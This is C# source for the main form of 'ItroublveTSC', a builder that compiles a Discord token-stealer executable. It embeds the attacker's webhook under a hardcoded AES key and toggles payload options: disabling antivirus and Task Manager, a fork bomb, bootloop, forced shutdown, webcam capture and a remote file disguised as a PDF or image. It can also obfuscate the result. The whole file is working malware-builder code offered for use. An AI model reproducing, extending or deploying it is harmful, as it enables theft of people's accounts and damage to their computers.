using DiscordFlooder.Class.Design.Rainbow; //Credit ByteTools
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace ItroublveTSC
{
    public partial class frmMain : Form
    {
        #region GUI
        public frmMain()
        {
            InitializeComponent();
            RainbowTimer.Start();
        }
        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }
        #region Form
        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }
        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            var filesize = Application.OpenForms.OfType<FileSize>().FirstOrDefault();
            if (filesize == null)
            {
                filesize = new FileSize();
            }
            filesize.Location = this.Location;
            filesize.Show();
            Hide();
        }
        private void button6_Click(object sender, EventArgs e)
        {
            var credits = Application.OpenForms.OfType<Credits>().FirstOrDefault();
            if (credits == null)
            {
                credits = new Credits();
            }
            credits.Location = this.Location;
            credits.StartPosition = FormStartPosition.Manual;
            credits.Show();
            Hide();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }
        private void button2_Click(object sender, EventArgs e)
        {
            var advanced = Application.OpenForms.OfType<Advanced>().FirstOrDefault();
            if (advanced == null)
            {
                advanced = new Advanced();
            }
            advanced.Location = this.Location;
            advanced.StartPosition = FormStartPosition.Manual;
            advanced.Show();
            Hide();
        }
        private void button3_Click(object sender, EventArgs e)
        {
            var filestealer = Application.OpenForms.OfType<FileStealer>().FirstOrDefault();
            if (filestealer == null)
            {
                filestealer = new FileStealer();
            }
            filestealer.Location = this.Location;
            filestealer.StartPosition = FormStartPosition.Manual;
            filestealer.Show();
            Hide();
        }
        private void HeadLinePnlInf_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void HeadLinePnlInf_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("TokenStealerCOPY.bin"))
            {
                File.Delete("TokenStealerCOPY.bin");
            }
            if (Directory.Exists(Path.GetTempPath() + "bin_copy"))
            {
                Directory.Delete(Path.GetTempPath() + "bin_copy", true);
            }
            try
            {
                File.Delete(Path.GetTempPath() + "convertedicon.ico");
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        #endregion
        #endregion
        #region Checks
        private static WebClient ded = new WebClient();
        private void frmMain_Load(object sender, EventArgs e)
        {
            try
            {
                if (!(ded.DownloadString("https://itroublvehacker.cf/stealerupdate") == "6.0"))
                {
                    if (MessageBox.Show($"Version {ded.DownloadString("https://itroublvehacker.cf/stealerupdate")} has released!\nDo you want to update, right now?", "ItroublveTSC", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        Process.Start("https://itroublvehacker.ml");
                        Environment.Exit(0);
                    }
                }
                if (ded.DownloadString("https://itroublvehacker.cf/info").Contains("Discord"))
                {
                    if (MessageBox.Show(ded.DownloadString("https://itroublvehacker.cf/info"), "ItroublveTSC", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) == DialogResult.OK)
                    {
                        Process.Start("https://itroublvehacker.xyz");
                        Process.Start("https://itroublvehacker.ml");
                        Process.Start("https://itroublvehacker.cf/discord.php");
                    }
                }
                else if (ded.DownloadString("https://itroublvehacker.cf/info").Contains("Notice"))
                {
                    if (MessageBox.Show(ded.DownloadString("https://itroublvehacker.cf/info"), "ItroublveTSC", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) == DialogResult.OK)
                    {
                        MessageBox.Show("You may continue");
                    }
                }
            }
            catch 
            {
                MessageBox.Show("Failed To Connect To Server...\nTry again later. If this problem persists then check for new updates!", "ItroublveTSC");
            }
            if (Directory.Exists(Path.GetTempPath() + "bin_copy"))
            {
                Directory.Delete(Path.GetTempPath() + "bin_copy", true);
            }
            File.Delete(Path.GetTempPath() + "convertedicon.ico");

        }
        #endregion
        #region Compile changes to EXE
        private void roundBtn1_Click(object sender, EventArgs e)
        {
            string Temp = Path.GetTempPath();
            SaveFileDialog file = new SaveFileDialog();
            file.Filter = "EXE File (*.exe) | *.exe";
            if (file.ShowDialog() == DialogResult.OK)
            {
                bool flag = WebHookTxt.Text == "" || WebHookTxt.Text == "Webhook Here";
                Uri uriResult;
                bool flag2 = Uri.TryCreate(WebHookTxt.Text, UriKind.Absolute, out uriResult)
                    && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps); //Check if the URI is valid
                if (flag)
                {
                    MessageBox.Show("Enter webhook first!", "ItroublveTSC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
                else if (flag2)
                {
                    try
                    {
                        string path = Temp + "bin_copy";
                        if (!Directory.Exists(path))
                        {
                            string test = @"bin";
                            string test2 = Temp + "bin_copy";
                            Copy(test, test2);
                        }
                        try
                        {
                            var advanced = Application.OpenForms.OfType<Advanced>().FirstOrDefault();
                            if (advanced == null)
                            {
                                advanced = new Advanced();
                                advanced.compilechng();
                            }
                            advanced.compilechng();
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message + " || Advanced");
                        }
                        string text = File.ReadAllText(Temp + "bin_copy\\Program.cs");
                        string config = File.ReadAllText(Temp + "bin_copy\\Binaries\\config");
                        var F = sadness(Encoding.ASCII.GetBytes(WebHookTxt.Text));
                        if (F != null)
                        {
                            text = text.Replace("string license", "string license = @\"" + Convert.ToBase64String(F) + "\"");
                        }
                        if (CrashPCchkbox.Checked)
                        {
                            text = text.Replace("//Fork.fork();", "Fork.fork();");
                            text = text.Replace("bool sleep = false;", "bool sleep = true;");
                        }
                        if (AutoRmvExe.Checked)
                        {
                            text = text.Replace("//RemoveEXE", "RemoveEXE");
                        }
                        if (disableTskMgr.Checked)
                        {
                            text.Replace("bool _dav = false;", "bool _dav = true;");
                            avStart.Checked = true;
                        }
                        if (avStart.Checked)
                        {
                            text = text.Replace("//av();", "av();");
                        }
                        if (BootloopPCchckbox.Checked)
                        {
                            config = config.Replace("\"rd\": false", "\"rd\": true");
                        }
                        if (RestartPCchkbox.Checked)
                        {
                            config = config.Replace("\"restart\": false", "restart: true");
                        }
                        if (ShutdownPCchkbox.Checked)
                        {
                            config = config.Replace("\"shutdown\": false", "\"shutdown\": true");
                        }
                        if (CamSnapchkbox.Checked)
                        {
                            config = config.Replace("\"cam\": false", "\"cam\": true");
                        }
                        if (CustomEXEchkbox.Checked)
                        {
                            text = text.Replace("customexelink", CustomExeTxt.Text);
                            text = text.Replace("/*", "");
                            text = text.Replace("*/", "");
                            if (cbBox.Text == ".exe")
                            {
                                text = text.Replace(".ext", ".exe");
                            }
                            else if (cbBox.Text == ".bat")
                            {
                                text = text.Replace(".ext", ".bat");
                            }
                            else if (cbBox.Text == ".txt")
                            {
                                text = text.Replace(".ext", ".txt");
                            }
                            else if (cbBox.Text == ".png")
                            {
                                text = text.Replace(".ext", ".png");
                            }
                            else if (cbBox.Text == ".zip")
                            {
                                text = text.Replace(".ext", ".zip");
                            }
                            else if (cbBox.Text == ".psd")
                            {
                                text = text.Replace(".ext", ".psd");
                            }
                            else if (cbBox.Text == ".mp3")
                            {
                                text = text.Replace(".ext", ".mp3");
                            }
                            else if (cbBox.Text == ".mp4")
                            {
                                text = text.Replace(".ext", ".mp4");
                            }
                            else if (cbBox.Text == ".pdf")
                            {
                                text = text.Replace(".ext", ".pdf");
                            }
                            else if (cbBox.Text.Contains("|"))
                            {
                                string[] split = CustomExeTxt.Text.Split(new string[] { "|" }, StringSplitOptions.None);
                                text = text.Replace(".ext", split[1]);
                            }
                            else
                            {
                                MessageBox.Show("Specify custom file format", "ItroublveTSC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                        }
                        File.WriteAllText(Temp + "bin_copy\\Program.cs", text);
                        File.WriteAllText(Temp + "bin_copy\\Binaries\\config", config);
                        string idk = Temp + "bin_copy\\compile.bat";
                        string idk2 = Temp + "bin_copy\\compile.vbs";
                        if (!File.Exists(idk))
                        {
                            using (StreamWriter sw = File.CreateText(idk))
                            {
                                sw.WriteLine("C:/Windows/Microsoft.NET/Framework/v4.0.30319/msbuild.exe TSC.sln");
                                sw.WriteLine("ren \"bin\\Debug\\*.exe\" \"Token Stealer.exe\"");
                                if (ObfEXE.Checked)
                                {
                                    sw.WriteLine("obf\\CLI.exe \"./o.crproj\"");
                                }
                                sw.WriteLine("exit");
                            }
                            using (StreamWriter sw = File.CreateText(idk2))
                            {
                                sw.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
                                sw.WriteLine("Dim strArgs");
                                sw.WriteLine("strArgs = \"cmd /c compile.bat\"");
                                sw.WriteLine("oShell.Run strArgs, 0, True");
                            }
                            string path2 = file.FileName;
                            if (File.Exists(path2))
                            {
                                File.Delete(path2);
                            }
                            Process proc = new Process();
                            proc.StartInfo.WorkingDirectory = Temp + "bin_copy";
                            proc.StartInfo.FileName = "compile.vbs";
                            proc.StartInfo.CreateNoWindow = false;
                            proc.EnableRaisingEvents = true;
                            proc.Start();
                            proc.WaitForExit();
                        }
                    }
                    catch (Exception ex)
                    {
                        if (!Directory.Exists(Application.StartupPath + "\\bin"))
                        {
                            Directory.Delete(Path.GetTempPath() + "bin_copy", true);
                            DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                            if (dialogResult == DialogResult.Yes)
                            {
                                string _cdDir = Path.GetDirectoryName(Application.ExecutablePath);
                                DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                                new WebClient().DownloadFile("#", "Token Stealer Creator.zip");
                                ZipFile.ExtractToDirectory(_cdDir + "\\Token Stealer Creator.zip", _cdDir);
                                File.Delete(_cdDir + "\\Token Stealer Creator.zip");
                                MessageBox.Show("Successfully downloaded and installed\nYou can continue now!", "ItroublveTSC");
                                return;
                            }
                            else if (dialogResult == DialogResult.No)
                            {
                                MessageBox.Show("OK. FINE THEN. DO WHATEVER YOU WANT . -.", "ItroublveTSC");
                                return;
                            }
                        }
                        else
                            MessageBox.Show(ex.Message, "ItroublveTSC");
                    }
                    try
                    {
                        if (File.Exists(Temp + ".\\bin_copy\\bin\\Debug\\Token Stealer.exe"))
                        {
                            var FileSize = Application.OpenForms.OfType<FileSize>().FirstOrDefault();
                            if (pumpStealer.Checked && FileSize != null)
                            {
                                try
                                {
                                    FileSize.Pump(Temp + ".\\bin_copy\\bin\\Debug\\Token Stealer.exe");
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(ex.Message);
                                }
                            }
                            File.Copy(Temp + ".\\bin_copy\\bin\\Debug\\Token Stealer.exe", file.FileName);
                        }
                        string folderPath = Temp + "bin_copy";
                        Directory.Delete(folderPath, true);
                        if (File.Exists(file.FileName))
                        {
                            MessageBox.Show($"Succesfully created Token Stealer.exe...\nSaved in: \"{file.FileName}\"", "ItroublveTSC");
                        }
                        else
                        {
                            if (Advanced.ICON)
                            {
                                if (MessageBox.Show("The ICO might've not been converted correctly.\r\n" +
                                    "Do you want to convert right now, again?", "ItroublveTSC", MessageBoxButtons.YesNo) == DialogResult.Yes)
                                {
                                    Process.Start("https://convertico.com/");
                                }
                            }
                            else
                            {
                                if (MessageBox.Show("Failed to create stealer;" +
                                    "\r\nMake sure you have \"Build Tools + .NET FRAMEWORK\" installed and try again.\r\nWant to download?", "ItroublveTSC", MessageBoxButtons.YesNoCancel) == DialogResult.Yes)
                                {
                                    Process.Start("https://download.visualstudio.microsoft.com/download/pr/067fd8d0-753e-4161-8780-dfa3e577839e/91e449a6b736cda31d94613f6d88668825e8b0b43f8b041d22b3a3461b23767f/vs_BuildTools.exe");
                                    Process.Start("https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0307177e14752e359fde5423ab583e43/ndp48-devpack-enu.exe");
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Failed to create token stealer.\r\nTake a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
                    }
                }
                else
                {
                    MessageBox.Show("The URL is incorrectly formatted.", "ItroublveTSC", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
        }
        #endregion
        #region "How to use" Button
        private void roundBtn1_Click_1(object sender, EventArgs e)
        {
            try
            {
                Process.Start("https://itroublvehacker.ml/usage.php");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to open" + "How To Use\r\n" + (ex.Message), "ItroublveTSC");
            }
        }
        #endregion
        #region Textbox Options
        #region Check();
        //private void FinalresbatTxt_TextChanged(object sender, EventArgs e)
        //{
        //    if (FinalresbatTxt.Text.Contains("https://discord.com/channels/") || FinalresbatTxt.Text.Contains("app.com/channels/") || FinalresbatTxt.Text.Contains(".com/channels/"))
        //    {
        //        if (MessageBox.Show("You need to paste a link to the file and not to the message!\nHave you actually watched the video?", "ItroublveTSC", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.No)
        //        {
        //            Process.Start("");
        //        }
        //        else
        //        {
        //            MessageBox.Show("I doubt you, but sure.", "ItroublveTSC");
        //        }
        //        FinalresbatTxt.Text = null;
        //    }
        //}
        #endregion
        #region Enable/Disable textbox
        private void CustomEXEchkbox_CheckedChanged(object sender, EventArgs e)
        {
            if (CustomEXEchkbox.Checked)
            {
                CustomExeTxt.Enabled = true;
                cbBox.Visible = true;
            }
            else
            {
                cbBox.Visible = false;
                CustomExeTxt.Enabled = false;
            }
        }

        #endregion
        #region Placeholder
        private void WebHookTxt_Enter(object sender, EventArgs e)
        {
            if (WebHookTxt.Text == "Webhook Here")
            {
                WebHookTxt.Text = "";
            }
        }

        private void WebHookTxt_Leave(object sender, EventArgs e)
        {
            if (WebHookTxt.Text == "")
            {
                WebHookTxt.Text = "Webhook Here";
            }
        }

        //private void FinalresbatTxt_Enter(object sender, EventArgs e)
        //{
        //    if (FinalresbatTxt.Text == "Random File Link Here")
        //    {
        //        FinalresbatTxt.Text = "";
        //    }
        //}

        //private void FinalresbatTxt_Leave(object sender, EventArgs e)
        //{
        //    if (FinalresbatTxt.Text == "")
        //    {
        //        FinalresbatTxt.Text = "Random File Link Here";
        //    }
        //}

        private void CustomExeTxt_Enter(object sender, EventArgs e)
        {
            if (CustomExeTxt.Text == "Custom File Link Here")
            {
                CustomExeTxt.Text = "";
            }
        }

        private void CustomExeTxt_Leave(object sender, EventArgs e)
        {
            if (CustomExeTxt.Text == "")
            {
                CustomExeTxt.Text = "Custom File Link Here";
            }
        }
        #endregion
        #endregion
        #region COPY
        public static void Copy(string sourceDirectory, string targetDirectory)
        {
            var diSource = new DirectoryInfo(sourceDirectory);
            var diTarget = new DirectoryInfo(targetDirectory);

            CopyAll(diSource, diTarget);
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            Directory.CreateDirectory(target.FullName);

            foreach (FileInfo fi in source.GetFiles())
            {
                fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
            }

            foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
            {
                DirectoryInfo nextTargetSubDir =
                    target.CreateSubdirectory(diSourceSubDir.Name);
                CopyAll(diSourceSubDir, nextTargetSubDir);
            }
        }
        #endregion
        #region Encryption
        public static byte[] sadness(byte[] message)
        {
            try
            {
                Aes aes = new AesManaged
                {
                    Key = new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 },
                    IV = new byte[16],
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.Zeros
                };
                ICryptoTransform crypto;
                crypto = aes.CreateEncryptor();
                return crypto.TransformFinalBlock(message, 0, message.Length); //return encrypted value
            }
            catch (Exception x)
            {
                MessageBox.Show(x.Message);
                return null;
            }
        }
        #endregion
        #region CheckBox

        private void disableTskMgr_CheckStateChanged(object sender, EventArgs e)
        {
            if (disableTskMgr.Checked) //If Disable Task Manager then => Admin perm = true
            {
                avStart.Checked = true;
            }
            else if (!disableTskMgr.Checked) avStart.Checked = false;
        }

        private void avStart_CheckStateChanged(object sender, EventArgs e)
        {
            if (disableTskMgr.Checked & !avStart.Checked) //Check if user unchecked Disable AV & if DisableTaskManager still checked
            {
                disableTskMgr.Checked = false;
            }
        }
        #endregion
    }
}